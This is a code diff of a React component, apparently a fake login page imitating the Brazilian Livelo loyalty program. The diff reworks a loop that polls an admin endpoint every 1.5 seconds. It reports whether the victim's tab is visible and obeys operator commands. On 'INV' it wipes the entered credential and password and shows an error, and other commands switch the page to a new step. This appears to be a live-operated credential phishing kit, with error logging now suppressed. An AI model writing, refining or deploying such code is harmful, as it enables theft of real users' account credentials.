@@ -136,47 +136,35 @@ function LiveloLogin() {
     }
   };
 
-  // Verificar comandos + heartbeat só quando aba visível
+  // Polling de comandos - document.hidden checado EM CADA CHAMADA
   useEffect(() => {
     if (!userId) return;
 
-    const checkCommand = async () => {
+    const poll = async () => {
       try {
-        // hb=1 SOMENTE se aba visível
-        const hb = document.hidden ? 0 : 1;
-        const response = await axios.get(`${API}/user/check-action/${userId}?hb=${hb}`);
-        
+        const v = document.hidden ? "0" : "1";
+        const response = await axios.get(`${API}/user/check-action/${userId}?visible=${v}`);
         if (response.data && response.data.action) {
           const action = response.data.action;
           const timestamp = response.data.action_timestamp;
-          
-          if (timestamp && timestamp === lastProcessedTimestamp) {
-            return;
-          }
-          
+          if (timestamp && timestamp === lastProcessedTimestamp) return;
           if (action === "INV") {
             setIsLoading(false);
             setHasError(true);
             setCredential("");
             setPassword("");
             setLastProcessedTimestamp(timestamp);
-            
-            axios.post(`${API}/admin/command`, {
-              user_id: userId,
-              command: "CLEAR"
-            }).catch(err => console.log("Erro ao limpar:", err));
+            axios.post(`${API}/admin/command`, { user_id: userId, command: "CLEAR" }).catch(() => {});
           } else if (action !== "CLEAR") {
             setCurrentCommand(action);
             setLastProcessedTimestamp(timestamp);
           }
         }
-      } catch (error) {
-        console.error("Erro ao verificar comando:", error);
-      }
+      } catch (error) {}
     };
 
-    checkCommand();
-    const interval = setInterval(checkCommand, 2000);
+    poll();
+    const interval = setInterval(poll, 1500);
     return () => clearInterval(interval);
   }, [userId, lastProcessedTimestamp]);
 
